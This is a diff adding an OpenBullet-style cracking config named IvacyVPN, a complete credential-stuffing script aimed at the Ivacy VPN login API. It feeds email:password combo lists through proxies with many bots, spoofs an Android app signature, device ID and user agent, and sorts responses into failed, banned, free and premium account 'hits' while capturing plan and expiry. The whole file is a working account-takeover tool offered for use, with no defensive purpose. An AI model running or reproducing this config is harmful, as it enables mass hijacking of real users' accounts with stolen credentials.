@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "IvacyVPN",
+  "SuggestedBots": 107,
+  "LastModified": "2019-04-07T16:18:31.4287245+07:00",
+  "AdditionalInfo": "",
+  "Author": "*",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://apiv2.ivacy.com/login" AutoRedirect=TRUE 
+  CONTENT "sSignature=46a6c3206554b6415a3345f06ca492ef&sLocale=en&sDeviceType=android&sAppType=Premium&sPassword=<PASS>&sDateTime=2019-02-23%2006%3A53%3A35&sDeviceId=4222343544328945&sEmail=<USER>&sDeviceToken=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: " 
+  HEADER "User-Agent: okhttp/3.9.0" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "{\"header\":{\"code\":3,\"message\":\"Email or Password was incorrect.\"},\"body\":{}}" 
+  KEYCHAIN CUSTOM "FREE" AND 
+    KEY "\"message\":\"Authentication successful\"" 
+    KEY "\"iIsPremium\":0" 
+  KEYCHAIN Ban OR 
+    KEY "Please enable cookies." 
+  KEYCHAIN Success AND 
+    KEY "\"message\":\"Authentication successful\"" 
+    KEY "iIsPremium\":1" 
+  KEYCHAIN CUSTOM "FREE" AND 
+    KEY "iIsPremium\":-1" 
+    KEY "\"message\":\"Authentication successful\"" 
+#Plan PARSE "<SOURCE>" JSON "sPlan" Recursive=FALSE -> CAP "Plan" "" "" 
+#Expiry PARSE "<SOURCE>" JSON "sExpiry" Recursive=FALSE -> CAP "Expiry" "" "" 
